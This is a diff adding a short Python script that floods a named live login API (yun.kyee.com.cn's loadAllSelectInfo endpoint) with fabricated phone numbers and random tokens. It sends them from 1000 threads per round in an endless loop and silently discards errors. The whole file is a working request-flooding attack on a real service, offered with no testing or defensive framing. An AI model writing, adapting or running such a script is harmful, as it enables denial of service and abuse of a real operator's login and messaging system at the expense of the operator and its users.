@@ -1,0 +1,66 @@
+import json
+import random
+import string
+import threading
+import requests
+
+url = "https://yun.kyee.com.cn/auth_server/LoginController/loadAllSelectInfo.next"
+
+headers = {
+    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
+    'Connection': 'keep-alive',
+    'origin': "https://yun.kyee.com.cn",
+    'referer': "https://yun.kyee.com.cn/login",
+    'X-Requested-With': "XMLHttpRequest",
+    'Accept': "*/*",
+    'Content-Length': "55",
+    'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
+    'Accept-Encoding': "gzip, deflate, br"
+}
+
+
+def requestApi():
+    fields = {
+        'telephone': str(randomName()),
+        'firstData': str(randomStr(44)),
+        'loginType': 0
+    },
+    try:
+        data  = requests.post(url=url, data=json.dumps(fields), headers=headers, timeout=5)
+        print(data.text)
+    except Exception as e:
+        e
+
+
+def randomName():
+    start = random.choice(['135', '136', '137', '139', '186', '183'])  # 存放前3位的号段，从中随机取一个
+    end = ''.join(random.sample(string.digits, 8))
+    return start + end
+
+
+def randomStr(lengthStr):
+    random_str = ''
+    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+    length = len(base_str) - 1
+    for i in range(lengthStr):
+        random_str += base_str[random.randint(0, length)]
+    return random_str + "="
+
+
+
+def threadSend():
+    threads = []
+    for t in range(1000):
+        threads.append(threading.Thread(target=requestApi, args=()))
+    for thr in threads:
+        thr.start()
+    for thr in threads:
+        thr.join()
+
+
+if __name__ == '__main__':
+    i = 0
+    while True:
+        threadSend()
+        i = i + 1
+        print(i)
